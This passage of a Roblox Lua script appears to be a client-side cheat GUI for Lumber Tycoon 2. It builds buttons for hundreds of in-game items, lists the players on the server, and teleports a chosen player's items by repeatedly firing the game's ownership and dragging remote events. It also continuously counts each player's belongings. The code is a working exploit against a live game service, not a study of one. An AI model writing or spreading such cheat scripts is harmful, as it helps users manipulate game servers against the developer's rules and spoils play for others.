BlackBall.BorderColor3 = Color3.new(0.6, 0, 0)
BlackBall.Position = UDim2.new(0, 5, 0, 4620)
BlackBall.Size = UDim2.new(0, 100, 0, 100)
BlackBall.Image = "rbxassetid://4518791512"
BlackBall.MouseButton1Down:connect(function()
Type.Text = "BlackBall"
SingleItemTpQty("BlackBall", PlyrSelz.Text, qty.Text)
end)

CountItems198 = Instance.new("TextLabel")
CountItems198.Parent = MoveOther
CountItems198.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems198.BackgroundTransparency = 0.6
CountItems198.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems198.Position = UDim2.new(0, 110, 0, 4675)
CountItems198.Size = UDim2.new(0, 25, 0, 20)
CountItems198.Font = Enum.Font.SourceSans
CountItems198.Text = "0"
CountItems198.TextColor3 = Color3.new(0, 1, 0)
CountItems198.TextSize = 25

TealBall = Instance.new("ImageButton")
TealBall.Name = "TealBall"
TealBall.Parent = MoveOther
TealBall.BackgroundColor3 = Color3.new(1, 1, 1)
TealBall.BackgroundTransparency = 0
TealBall.BorderColor3 = Color3.new(0.6, 0, 0)
TealBall.Position = UDim2.new(0, 5, 0, 4725)
TealBall.Size = UDim2.new(0, 100, 0, 100)
TealBall.Image = "rbxassetid://4518791763"
TealBall.MouseButton1Down:connect(function()
Type.Text = "TealBall"
SingleItemTpQty("TealBall", PlyrSelz.Text, qty.Text)
end)

CountItems199 = Instance.new("TextLabel")
CountItems199.Parent = MoveOther
CountItems199.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems199.BackgroundTransparency = 0.6
CountItems199.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems199.Position = UDim2.new(0, 110, 0, 4780)
CountItems199.Size = UDim2.new(0, 25, 0, 20)
CountItems199.Font = Enum.Font.SourceSans
CountItems199.Text = "0"
CountItems199.TextColor3 = Color3.new(0, 1, 0)
CountItems199.TextSize = 25

Bobblehead6 = Instance.new("ImageButton")
Bobblehead6.Name = "Bobblehead6"
Bobblehead6.Parent = MoveOther
Bobblehead6.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead6.BackgroundTransparency = 0
Bobblehead6.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead6.Position = UDim2.new(0, 5, 0, 4830)
Bobblehead6.Size = UDim2.new(0, 100, 0, 100)
Bobblehead6.Image = "rbxassetid://4518791912"
Bobblehead6.MouseButton1Down:connect(function()
Type.Text = "Bobblehead6"
SingleItemTpQty("Bobblehead6", PlyrSelz.Text, qty.Text)
end)

CountItems200 = Instance.new("TextLabel")
CountItems200.Parent = MoveOther
CountItems200.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems200.BackgroundTransparency = 0.6
CountItems200.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems200.Position = UDim2.new(0, 110, 0, 4885)
CountItems200.Size = UDim2.new(0, 25, 0, 20)
CountItems200.Font = Enum.Font.SourceSans
CountItems200.Text = "0"
CountItems200.TextColor3 = Color3.new(0, 1, 0)
CountItems200.TextSize = 25

Bobblehead7 = Instance.new("ImageButton")
Bobblehead7.Name = "Bobblehead7"
Bobblehead7.Parent = MoveOther
Bobblehead7.BackgroundColor3 = Color3.new(1, 1, 1)
Bobblehead7.BackgroundTransparency = 0
Bobblehead7.BorderColor3 = Color3.new(0.6, 0, 0)
Bobblehead7.Position = UDim2.new(0, 5, 0, 4935)
Bobblehead7.Size = UDim2.new(0, 100, 0, 100)
Bobblehead7.Image = "rbxassetid://4518791636"
Bobblehead7.MouseButton1Down:connect(function()
Type.Text = "Bobblehead7"
SingleItemTpQty("Bobblehead7", PlyrSelz.Text, qty.Text)
end)

CountItems201 = Instance.new("TextLabel")
CountItems201.Parent = MoveOther
CountItems201.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems201.BackgroundTransparency = 0.6
CountItems201.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems201.Position = UDim2.new(0, 110, 0, 4990)
CountItems201.Size = UDim2.new(0, 25, 0, 20)
CountItems201.Font = Enum.Font.SourceSans
CountItems201.Text = "0"
CountItems201.TextColor3 = Color3.new(0, 1, 0)
CountItems201.TextSize = 25



Player2z = Instance.new("TextButton")
Player3z = Instance.new("TextButton")
Player4z = Instance.new("TextButton")
Player5z = Instance.new("TextButton")
Player6z = Instance.new("TextButton")

PlyrSelz = Instance.new("TextLabel")
PlyrSelz.Name = "PlyrSelz"
PlyrSelz.Parent = MoveFrame
PlyrSelz.BackgroundColor3 = Color3.new(0, 0, 0)
PlyrSelz.BorderColor3 = Color3.new(1, 0, 0)
PlyrSelz.BackgroundTransparency = 0.6
PlyrSelz.Position = UDim2.new(0, 5, 0, 27)
PlyrSelz.Size = UDim2.new(0, 160, 0, 20)
PlyrSelz.Font = Enum.Font.Fantasy
PlyrSelz.Text = ""
PlyrSelz.TextColor3 = Color3.new(0, 1, 0)
PlyrSelz.TextSize = 14

Player1z = Instance.new("TextButton")
Player1z.Name = "Player1"
Player1z.Parent = MoveFrame
Player1z.BackgroundColor3 = Color3.new(0, 0, 0)
Player1z.BackgroundTransparency = 0.6
Player1z.BorderColor3 = Color3.new(1, 0, 0)
Player1z.Position = UDim2.new(0, 5, 0, 27)
Player1z.Size = UDim2.new(0, 160, 0, 20)
Player1z.Font = Enum.Font.Fantasy
Player1z.Text = ""
Player1z.TextColor3 = Color3.new(0, 1, 0)
Player1z.TextSize = 14




--SCRIPTA
--------------------------------------------------------------------------------------------------------------------------------


	local buttons = {
		Player1z,
		Player2z,
		Player3z,
		Player4z,
		Player5z,
		Player6z
	}
	spawn(function()
		while true do
			Player1z.Text = ""
			Player2z.Text = ""
			Player3z.Text = ""
			Player4z.Text = ""
			Player5z.Text = ""
			Player6z.Text = ""
			for i, v in pairs(game.Players:GetChildren()) do
				buttons[i].Text = v.Name
				buttons[i].Visible = true
			end
			wait(0.5)
		end
	end)

	Player1z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player1z.Text
    end)
    Player2z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player2z.Text
    end)
    Player3z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player3z.Text
    end)
    Player4z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player4z.Text
    end)
    Player5z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player5z.Text
    end)
    Player6z.MouseButton1Down:connect(function()
      PlyrSelz.Text = Player6z.Text
    end)

--SCRIPTB
--------------------------------------------------------------------------------------------------------------------------------
function Drag(It)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(It)
end

function TpItemOrPlank(Item, PartName, InfrontX, HeightY, Rotation)
	Character = game.Players.LocalPlayer.Character
	if Item:FindFirstChild("Type") and Item.Type.Value == "Vehicle" then 
		spawn(function()
		cframe = CFrame.new(Character.HumanoidRootPart.Position + Vector3.new(0,HeightY,0) + Character.HumanoidRootPart.CFrame.LookVector * InfrontX)
			for i=1,10 do 
				wait()
				Item:SetPrimaryPartCFrame(cframe * CFrame.Angles(math.rad(Rotation.x), math.rad(Character.Torso.Orientation.y + Rotation.y), math.rad(Rotation.z)))
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Item[PartName])
				game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item[PartName])
			end
		end)
	else
		for i=1,10 do 
			spawn(function()
				Item[PartName].Orientation = Character.HumanoidRootPart.Orientation + Rotation
				Item:MoveTo(Character.HumanoidRootPart.Position + Vector3.new(0,HeightY,0) + Character.HumanoidRootPart.CFrame.LookVector * InfrontX)
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Item[PartName])
				game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item[PartName])
			end)
		end
	end
end
function CheckWL(Player)
	Player = Player
	if Player == game.Players.LocalPlayer.Name then 
		return true
	elseif Player ~= game.Players.LocalPlayer.Name and game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(game.Players[Player]) then 
		return true
	else return false
	end
end
function SingleItemTpQty(ItemName, Player, qty)
    Teleported = 0
	Player = tostring(Player)
	Whitelisted = CheckWL(Player)
	qty = tonumber(qty)
    for a,b in pairs(workspace.PlayerModels:GetChildren()) do 
        if Teleported < qty then
            if b:FindFirstChild("Owner") and tostring(b.Owner.Value) == tostring(Player) and Whitelisted == true then
                if b:FindFirstChild("Main") and b:FindFirstChild("PurchasedBoxItemName") and b.PurchasedBoxItemName.Value == ItemName then 
					TpItemOrPlank(b, "Main", 7.5, -2, Vector3.new(0,90,0))
					Teleported = Teleported + 1
				elseif b:FindFirstChild("Type") and b.Type.Value == "Vehicle" and b:FindFirstChild("ItemName") and b.ItemName.Value == ItemName then
					TpItemOrPlank(b, "Main", 10, -2, Vector3.new(0,90,0))
					Teleported = Teleported + 1
                elseif b:FindFirstChild("ItemName") and b.ItemName.Value == ItemName and b:FindFirstChild("Main") then 
					TpItemOrPlank(b, "Main", 7.5, -2, Vector3.new(0,90,0))
					Teleported = Teleported + 1
				elseif b:FindFirstChild("TreeClass") and b.TreeClass.Value == ItemName and b:FindFirstChild("WoodSection") then
					TpItemOrPlank(b, "WoodSection", 7.5, -2, Vector3.new(90,90,0))
					Teleported = Teleported + 1
                end
            end
        elseif Teleported == qty or Teleported > qty then
            return
        end
    end
end

--SCRIPTC
---------------------------------------------------------------------------------------------------------------------------------------------
ItemLists = {}

function CreateTableOfPath(Path)
	for a,b in pairs(Path:GetChildren()) do 
		ItemLists[b.name] = {}
	end
end

Extras = {"UtilityTruck_Vehicle", "UtilityTruck2_Vehicle", "SmallTrailer_Vehicle", "Pickup1_Vehicle", "Trailer2_Vehicle", "Sleigh_Vehicle", "Birch", "CaveCrawler", "Cherry", "Oak", "Fir", "Frost", "Generic", "GoldSwampy", "Koa", "Volcano", "Palm", "LoneCave", "Pine", "SpookyNeon", "SnowGlow", "Spooky", "Walnut", "GreenSwampy"}

for a,b in pairs(Extras) do 
	ItemLists[b] = {}
end

CreateTableOfPath(game.ReplicatedStorage.Purchasables.Tools.AllTools)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.Other)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.Other.Gifts)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.Vehicles)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.WireObjects)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.Structures.HardStructures)
CreateTableOfPath(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures)

for a,b in pairs(workspace.PlayerModels:GetChildren()) do 
	if b:FindFirstChild("ItemName") then 
		if b:FindFirstChildOfClass("Part") or b:FindFirstChild("Main") then 
			table.insert(ItemLists[b.ItemName.Value], b)
		end
	elseif b:FindFirstChild("ToolName") then
		if b:FindFirstChildOfClass("Part") or b:FindFirstChild("Main") then
			table.insert(ItemLists[b.ToolName.Value], b)
		end
	elseif b:FindFirstChild("TreeClass") then 
		if b:FindFirstChildOfClass("Part") or b:FindFirstChild("WoodSection") then
			table.insert(ItemLists[b.TreeClass.Value], b)
		end
	elseif b:FindFirstChild("PurchasedBoxItemName") then 
		if b:FindFirstChildOfClass("Part") or b:FindFirstChild("Main") then 
			table.insert(ItemLists[b.PurchasedBoxItemName.Value], b)
		end
	end
end

workspace.PlayerModels.ChildAdded:Connect(function(Added)
	wait(.5)
	if Added:FindFirstChild("ItemName") then 
		table.insert(ItemLists[Added.ItemName.Value], Added)
	elseif Added:FindFirstChild("ToolName") then 
		table.insert(ItemLists[Added.ToolName.Value], Added)
	elseif Added:FindFirstChild("TreeClass") then 
		table.insert(ItemLists[Added.TreeClass.Value], Added)
	elseif Added:FindFirstChild("PurchasedBoxItemName") then 
		table.insert(ItemLists[Added.PurchasedBoxItemName.Value], Added)
	end
end)

function CountItemsF(ItemName, Owner)
	Count = 0
	for a,b in pairs(ItemLists[ItemName]) do 
		if b.Parent ~= nil and b:FindFirstChild("Owner") and tostring(b.Owner.Value) == tostring(Owner) then 
			Count = Count + 1
		elseif b.Parent == nil then 
			table.remove(ItemLists[ItemName], a)
		end
	end
	return Count
end

spawn(function()
    while wait(.05) do
        CountItems.Text = CountItemsF("Birch", PlyrSelz.Text)
        wait(.05)
        CountItems2.Text = CountItemsF("Cherry", PlyrSelz.Text)
        wait(.05)        
        CountItems3.Text = CountItemsF("Generic", PlyrSelz.Text)
        wait(.05)
        CountItems4.Text = CountItemsF("Oak", PlyrSelz.Text)
        wait(.05)
        CountItems5.Text = CountItemsF("Palm", PlyrSelz.Text)
        wait(.05)
        CountItems6.Text = CountItemsF("Pine", PlyrSelz.Text)
        wait(.05)
        CountItems7.Text = CountItemsF("Walnut", PlyrSelz.Text)
        wait(.05)
        CountItems8.Text = CountItemsF("Koa", PlyrSelz.Text)
        wait(.05)
        CountItems9.Text = CountItemsF("Volcano", Player1z.Text)
        wait(.05)
        CountItems10.Text = CountItemsF("GoldSwampy", PlyrSelz.Text)
        wait(.05)
        CountItems11.Text = CountItemsF("GreenSwampy", PlyrSelz.Text)
        wait(.05)
        CountItems12.Text = CountItemsF("SnowGlow", PlyrSelz.Text)
        wait(.05)
        CountItems13.Text = CountItemsF("CaveCrawler", PlyrSelz.Text)
        wait(.05)
        CountItems14.Text = CountItemsF("Spooky", PlyrSelz.Text)
        wait(.05)
        CountItems15.Text = CountItemsF("LoneCave", PlyrSelz.Text)
        wait(.05)
        CountItems16.Text = CountItemsF("SpookyNeon", PlyrSelz.Text)
        wait(.05)
        CountItems17.Text = CountItemsF("Frost", PlyrSelz.Text)
        wait(.05)
        CountItems18.Text = CountItemsF("Fir", PlyrSelz.Text)
        wait(.05)
        CountItems19.Text = CountItemsF("Painting1", PlyrSelz.Text)
        wait(.05)
        CountItems20.Text = CountItemsF("Painting2", PlyrSelz.Text)
        wait(.05)
        CountItems21.Text = CountItemsF("Painting3", PlyrSelz.Text)
        wait(.05)
        CountItems22.Text = CountItemsF("Painting4", PlyrSelz.Text)
        wait(.05)
        CountItems23.Text = CountItemsF("Painting5", PlyrSelz.Text)
        wait(.05)
        CountItems24.Text = CountItemsF("Painting6", PlyrSelz.Text)
        wait(.05)
        CountItems25.Text = CountItemsF("Painting7", PlyrSelz.Text)
        wait(.05)
        CountItems26.Text = CountItemsF("Painting8", PlyrSelz.Text)
        wait(.05)
        CountItems27.Text = CountItemsF("Painting9", PlyrSelz.Text)
        wait(.05)
        CountItems28.Text = CountItemsF("Painting10", PlyrSelz.Text)
        wait(.05)
        CountItems29.Text = CountItemsF("FloorLamp1", PlyrSelz.Text)
        wait(.05)
        CountItems30.Text = CountItemsF("WallLight1", PlyrSelz.Text)
        wait(.05)
        CountItems31.Text = CountItemsF("WallLight2", PlyrSelz.Text)
        wait(.05)
        CountItems32.Text = CountItemsF("Seat_Armchair", PlyrSelz.Text)
        wait(.05)
        CountItems33.Text = CountItemsF("Seat_Couch", PlyrSelz.Text)
        wait(.05)
        CountItems34.Text = CountItemsF("Seat_Loveseat", PlyrSelz.Text)
        wait(.05)
        CountItems35.Text = CountItemsF("Bed1", PlyrSelz.Text)
        wait(.05)
        CountItems36.Text = CountItemsF("Bed2", PlyrSelz.Text)
        wait(.05)
        CountItems37.Text = CountItemsF("Refridgerator", PlyrSelz.Text)
        wait(.05)
        CountItems38.Text = CountItemsF("Stove", PlyrSelz.Text)
        wait(.05)
        CountItems39.Text = CountItemsF("Dishwasher", PlyrSelz.Text)
        wait(.05)
        CountItems40.Text = CountItemsF("Toilet", PlyrSelz.Text)
        wait(.05)
        CountItems41.Text = CountItemsF("Lamp1", PlyrSelz.Text)
        wait(.05)
        CountItems42.Text = CountItemsF("StraightConveyor", PlyrSelz.Text)
        wait(.05)
        CountItems43.Text = CountItemsF("TiltConveyor", PlyrSelz.Text)
        wait(.05)
        CountItems44.Text = CountItemsF("TightTurnConveyor", PlyrSelz.Text)
        wait(.05)
        CountItems45.Text = CountItemsF("ConveyorFunnel", PlyrSelz.Text)
        wait(.05)
        CountItems46.Text = CountItemsF("ConveyorSwitch", PlyrSelz.Text)
        wait(.05)
        CountItems47.Text = CountItemsF("StraightSwitchConveyorRight", PlyrSelz.Text)
        wait(.05)
        CountItems48.Text = CountItemsF("StraightSwitchConveyorLeft", PlyrSelz.Text)
        wait(.05)
        CountItems49.Text = CountItemsF("LogSweeper", PlyrSelz.Text)
        wait(.05)
        CountItems50.Text = CountItemsF("ConveyorSupports", PlyrSelz.Text)
        wait(.05)
        CountItems51.Text = CountItemsF("TightTurnConveyorSupports", PlyrSelz.Text)
        wait(.05)
        CountItems52.Text = CountItemsF("GlassDoor1", PlyrSelz.Text)
        wait(.05)
        CountItems53.Text = CountItemsF("GlassPane1", PlyrSelz.Text)
        wait(.05)
        CountItems54.Text = CountItemsF("GlassPane2", PlyrSelz.Text)
        wait(.05)
        CountItems55.Text = CountItemsF("GlassPane3", PlyrSelz.Text)
        wait(.05)
        CountItems56.Text = CountItemsF("GlassPane4", PlyrSelz.Text)
        wait(.05)
        CountItems57.Text = CountItemsF("Sawmill", PlyrSelz.Text)
        wait(.05)
        CountItems58.Text = CountItemsF("Sawmill2", PlyrSelz.Text)
        wait(.05)
        CountItems59.Text = CountItemsF("Sawmill3", PlyrSelz.Text)
        wait(.05)
        CountItems60.Text = CountItemsF("Sawmill4", PlyrSelz.Text)
        wait(.05)
        CountItems61.Text = CountItemsF("Sawmill4L", PlyrSelz.Text)
        wait(.05)
        CountItems62.Text = CountItemsF("BasicHatchet", PlyrSelz.Text)
        wait(.05)
        CountItems63.Text = CountItemsF("Axe1", PlyrSelz.Text)
        wait(.05)
        CountItems64.Text = CountItemsF("Axe2", PlyrSelz.Text)
        wait(.05)
        CountItems65.Text = CountItemsF("AxeAlphaTesters", PlyrSelz.Text)
        wait(.05)
        CountItems66.Text = CountItemsF("Rukiryaxe", PlyrSelz.Text)
        wait(.05)
        CountItems67.Text = CountItemsF("Axe3", PlyrSelz.Text)
        wait(.05)
        CountItems68.Text = CountItemsF("AxeBetaTesters", PlyrSelz.Text)
        wait(.05)
        CountItems69.Text = CountItemsF("FireAxe", PlyrSelz.Text)
        wait(.05)
        CountItems70.Text = CountItemsF("SilverAxe", PlyrSelz.Text)
        wait(.05)
        CountItems71.Text = CountItemsF("EndTimesAxe", PlyrSelz.Text)
        wait(.05)
        CountItems72.Text = CountItemsF("AxeChicken", PlyrSelz.Text)
        wait(.05)
        CountItems73.Text = CountItemsF("CandyCaneAxe", PlyrSelz.Text)
        wait(.05)
        CountItems74.Text = CountItemsF("Beesaxe", PlyrSelz.Text)
        wait(.05)
        CountItems75.Text = CountItemsF("AxeAmber", PlyrSelz.Text)
        wait(.05)
        CountItems76.Text = CountItemsF("GingerbreadAxe", PlyrSelz.Text)
        wait(.05)
        CountItems77.Text = CountItemsF("ManyAxe", PlyrSelz.Text)
        wait(.05)
        CountItems78.Text = CountItemsF("AxeTwitter", PlyrSelz.Text)
        wait(.05)
        CountItems79.Text = CountItemsF("RustyAxe", PlyrSelz.Text)
        wait(.05)
        CountItems80.Text = CountItemsF("CaveAxe", PlyrSelz.Text)
        wait(.05)
        CountItems81.Text = CountItemsF("UtilityTruck", PlyrSelz.Text)
        wait(.05)
        CountItems82.Text = CountItemsF("UtilityTruck2", PlyrSelz.Text)
        wait(.05)
        CountItems83.Text = CountItemsF("Pickup1", PlyrSelz.Text)
        wait(.05)
        CountItems84.Text = CountItemsF("SmallTrailer", PlyrSelz.Text)
        wait(.05)
        CountItems85.Text = CountItemsF("Trailer2", PlyrSelz.Text)
        wait(.05)
        CountItems86.Text = CountItemsF("Sleigh", PlyrSelz.Text)
        wait(.05)
        CountItems87.Text = CountItemsF("Wire", PlyrSelz.Text)
        wait(.05)
        CountItems88.Text = CountItemsF("Lever0", PlyrSelz.Text)
        wait(.05)
        CountItems89.Text = CountItemsF("Button0", PlyrSelz.Text)
        wait(.05)        
        CountItems90.Text = CountItemsF("ChopSaw", PlyrSelz.Text)
        wait(.05)
        CountItems91.Text = CountItemsF("PressurePlate", PlyrSelz.Text)
        wait(.05)
        CountItems92.Text = CountItemsF("SignalSustain", PlyrSelz.Text)
        wait(.05)
        CountItems93.Text = CountItemsF("Laser", PlyrSelz.Text)
        wait(.05)
        CountItems94.Text = CountItemsF("LaserReceiver", PlyrSelz.Text)
        wait(.05)
        CountItems95.Text = CountItemsF("Hatch", PlyrSelz.Text)
        wait(.05)
        CountItems96.Text = CountItemsF("GateNOT", PlyrSelz.Text)
        wait(.05)
        CountItems97.Text = CountItemsF("GateOR", PlyrSelz.Text)
        wait(.05)
        CountItems98.Text = CountItemsF("GateAND", PlyrSelz.Text)
        wait(.05)
        CountItems99.Text = CountItemsF("GateXOR", PlyrSelz.Text)
        wait(.05)
        CountItems100.Text = CountItemsF("WoodChecker", PlyrSelz.Text)
        wait(.05)
        CountItems101.Text = CountItemsF("SignalDelay", PlyrSelz.Text)
        wait(.05)
        CountItems102.Text = CountItemsF("NeonWireRed", PlyrSelz.Text)
        wait(.05)
        CountItems103.Text = CountItemsF("NeonWireOrange", PlyrSelz.Text)
        wait(.05)
        CountItems104.Text = CountItemsF("NeonWireYellow", PlyrSelz.Text)
        wait(.05)
        CountItems105.Text = CountItemsF("NeonWireCyan", PlyrSelz.Text)
        wait(.05)
        CountItems106.Text = CountItemsF("NeonWireGreen", PlyrSelz.Text)
        wait(.05)
        CountItems107.Text = CountItemsF("NeonWireBlue", PlyrSelz.Text)
        wait(.05)
        CountItems108.Text = CountItemsF("NeonWireViolet", PlyrSelz.Text)
        wait(.05)
        CountItems109.Text = CountItemsF("NeonWireWhite", PlyrSelz.Text)
        wait(.05)
        CountItems110.Text = CountItemsF("IcicleWireAmber", PlyrSelz.Text)
        wait(.05)
        CountItems111.Text = CountItemsF("IcicleWireRed", PlyrSelz.Text)
        wait(.05)
        CountItems112.Text = CountItemsF("IcicleWireGreen", PlyrSelz.Text)
        wait(.05)
        CountItems113.Text = CountItemsF("IcicleWireBlue", PlyrSelz.Text)
        wait(.05)
        CountItems114.Text = CountItemsF("IcicleWireMagenta", PlyrSelz.Text)
        wait(.05)
        CountItems115.Text = CountItemsF("IcicleWireHalloween", PlyrSelz.Text)
        wait(.05)
        CountItems116.Text = CountItemsF("FireworkLauncher", PlyrSelz.Text)
        wait(.05)
        CountItems117.Text = CountItemsF("ClockSwitch", PlyrSelz.Text)
        wait(.05)
        CountItems118.Text = CountItemsF("2016CGift_Ut", PlyrSelz.Text)
        wait(.05)
        CountItems119.Text = CountItemsF("2015CGift_Coal", PlyrSelz.Text)
        wait(.05)
        CountItems120.Text = CountItemsF("2015CGift_Red", PlyrSelz.Text)
        wait(.05)        
        CountItems121.Text = CountItemsF("2016CGift_Sweet", PlyrSelz.Text)
        wait(.05)
        CountItems122.Text = CountItemsF("2015CGift_Volcano", PlyrSelz.Text)
        wait(.05)
        CountItems123.Text = CountItemsF("2015CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems124.Text = CountItemsF("2016CGift_Blue", PlyrSelz.Text)
        wait(.05)
        CountItems125.Text = CountItemsF("2016CGift_Big", PlyrSelz.Text)
        wait(.05)
        CountItems126.Text = CountItemsF("2016CGift_Jingle", PlyrSelz.Text)
        wait(.05)
        CountItems127.Text = CountItemsF("2016CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems128.Text = CountItemsF("2018CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems129.Text = CountItemsF("2017CGift_Green", PlyrSelz.Text)
        wait(.05)
        CountItems130.Text = CountItemsF("2017CGift_GreatTimes", PlyrSelz.Text)
        wait(.05)
        CountItems131.Text = CountItemsF("2017CGift_Modern", PlyrSelz.Text)
        wait(.05)
        CountItems132.Text = CountItemsF("2017CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems133.Text = CountItemsF("2019CGift_Wobble_", PlyrSelz.Text)
        wait(.05)
        CountItems134.Text = CountItemsF("2017CGift_Gold", PlyrSelz.Text)
        wait(.05)
        CountItems135.Text = CountItemsF("2018CGift_Snow", PlyrSelz.Text)
        wait(.05)
        CountItems136.Text = CountItemsF("2018CGift_Plate", PlyrSelz.Text)
        wait(.05)
        CountItems137.Text = CountItemsF("2018CGift_Cocoa", PlyrSelz.Text)
        wait(.05)
        CountItems138.Text = CountItemsF("2018CGift_Candy", PlyrSelz.Text)
        wait(.05)
        CountItems139.Text = CountItemsF("2018CGift_Duck", PlyrSelz.Text)
        wait(.05)
        CountItems140.Text = CountItemsF("2018CGift_Cone", PlyrSelz.Text)
        wait(.05)
        CountItems141.Text = CountItemsF("2018CGift_Sled", PlyrSelz.Text)
        wait(.05)
        CountItems142.Text = CountItemsF("2018CGift_GingerAxe", PlyrSelz.Text)
        wait(.05)
        CountItems143.Text = CountItemsF("2018CGift_Plum", PlyrSelz.Text)
        wait(.05)
        CountItems144.Text = CountItemsF("2019CGift_Yellow_", PlyrSelz.Text)
        wait(.05)
        CountItems145.Text = CountItemsF("2019CGift_Bowl", PlyrSelz.Text)
        wait(.05)
        CountItems146.Text = CountItemsF("2019CGift_Rusty", PlyrSelz.Text)
        wait(.05)
        CountItems147.Text = CountItemsF("2019CGift_Cola", PlyrSelz.Text)
        wait(.05)
        CountItems148.Text = CountItemsF("2019CGift_Burnt", PlyrSelz.Text)
        wait(.05)
        CountItems149.Text = CountItemsF("2020CGift_Teal", PlyrSelz.Text)
        wait(.05)
        CountItems150.Text = CountItemsF("2020CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems151.Text = CountItemsF("2020CGift_Cave", PlyrSelz.Text)
        wait(.05)
        CountItems152.Text = CountItemsF("2021CGift_Black", PlyrSelz.Text)
        wait(.05)
        CountItems153.Text = CountItemsF("2021CGift_Wobble", PlyrSelz.Text)
        wait(.05)
        CountItems154.Text = CountItemsF("CanOfCranberry", PlyrSelz.Text)
        wait(.05)
        CountItems155.Text = CountItemsF("BagOfCandy", PlyrSelz.Text)
        wait(.05)
        CountItems156.Text = CountItemsF("Candy", PlyrSelz.Text)
        wait(.05)
        CountItems157.Text = CountItemsF("CandyCane", PlyrSelz.Text)
        wait(.05)
        CountItems158.Text = CountItemsF("Scoobis", PlyrSelz.Text)
        wait(.05)
        CountItems159.Text = CountItemsF("Spork", PlyrSelz.Text)
        wait(.05)
        CountItems160.Text = CountItemsF("CoalLump", PlyrSelz.Text)
        wait(.05)
        CountItems161.Text = CountItemsF("Snowball", PlyrSelz.Text)
        wait(.05)
        CountItems162.Text = CountItemsF("Plate", PlyrSelz.Text)
        wait(.05)
        CountItems163.Text = CountItemsF("Cocoa", PlyrSelz.Text)
        wait(.05)
        CountItems164.Text = CountItemsF("Duck", PlyrSelz.Text)
        wait(.05)
        CountItems165.Text = CountItemsF("Cone", PlyrSelz.Text)
        wait(.05)
        CountItems166.Text = CountItemsF("Toboggan", PlyrSelz.Text)
        wait(.05)
        CountItems167.Text = CountItemsF("B1", PlyrSelz.Text)
        wait(.05)
        CountItems168.Text = CountItemsF("PumpkinClassic", PlyrSelz.Text)
        wait(.05)
        CountItems169.Text = CountItemsF("PumpkinDark", PlyrSelz.Text)
        wait(.05)
        CountItems170.Text = CountItemsF("PumpkinGreen", PlyrSelz.Text)
        wait(.05)
        CountItems171.Text = CountItemsF("PumpkinCursed", PlyrSelz.Text)
        wait(.05)
        CountItems172.Text = CountItemsF("PumpkinGhastly", PlyrSelz.Text)
        wait(.05)
        CountItems173.Text = CountItemsF("PumpkinLumbkin", PlyrSelz.Text)
        wait(.05)
        CountItems174.Text = CountItemsF("PropertySoldSign", PlyrSelz.Text)
        wait(.05)
        CountItems175.Text = CountItemsF("Turkey", PlyrSelz.Text)
        wait(.05)
        CountItems176.Text = CountItemsF("Turkey2", PlyrSelz.Text)
        wait(.05)
        CountItems177.Text = CountItemsF("Turkey3", PlyrSelz.Text)
        wait(.05)
        CountItems178.Text = CountItemsF("Eye1", PlyrSelz.Text)
        wait(.05)
        CountItems179.Text = CountItemsF("BlueBaii", PlyrSelz.Text)
        wait(.05)
        CountItems180.Text = CountItemsF("BlueBall", PlyrSelz.Text)
        wait(.05)
        CountItems181.Text = CountItemsF("GreenBall", PlyrSelz.Text)
        wait(.05)
        CountItems182.Text = CountItemsF("RedBall", PlyrSelz.Text)
        wait(.05)
        CountItems183.Text = CountItemsF("PlumBall", PlyrSelz.Text)
        wait(.05)
        CountItems184.Text = CountItemsF("Bobblehead", PlyrSelz.Text)
        wait(.05)
        CountItems185.Text = CountItemsF("Bobblehead2", PlyrSelz.Text)
        wait(.05)
        CountItems186.Text = CountItemsF("Bobblehead3", PlyrSelz.Text)
        wait(.05)
        CountItems187.Text = CountItemsF("Bobblehead4", PlyrSelz.Text)
        wait(.05)
        CountItems188.Text = CountItemsF("Bobblehead5", PlyrSelz.Text)
        wait(.05)
        CountItems189.Text = CountItemsF("WorkLight", PlyrSelz.Text)
        wait(.05)
        CountItems190.Text = CountItemsF("BagOfSand", PlyrSelz.Text)
        wait(.05)        
        CountItems191.Text = CountItemsF("CanOfWorms", PlyrSelz.Text)
        wait(.05)
        CountItems192.Text = CountItemsF("LightBulb", PlyrSelz.Text)
        wait(.05)
        CountItems193.Text = CountItemsF("Dynamite", PlyrSelz.Text)
        wait(.05)
        CountItems194.Text = CountItemsF("Turkey4", PlyrSelz.Text)
        wait(.05)
        CountItems195.Text = CountItemsF("BurgerCola", PlyrSelz.Text)
        wait(.05)
        CountItems196.Text = CountItemsF("Turkey5", PlyrSelz.Text)
        wait(.05)        
        CountItems197.Text = CountItemsF("Bowl", PlyrSelz.Text)
        wait(.05)
        CountItems198.Text = CountItemsF("BlackBall", PlyrSelz.Text)
        wait(.05)
        CountItems199.Text = CountItemsF("TealBall", PlyrSelz.Text)
        wait(.05)
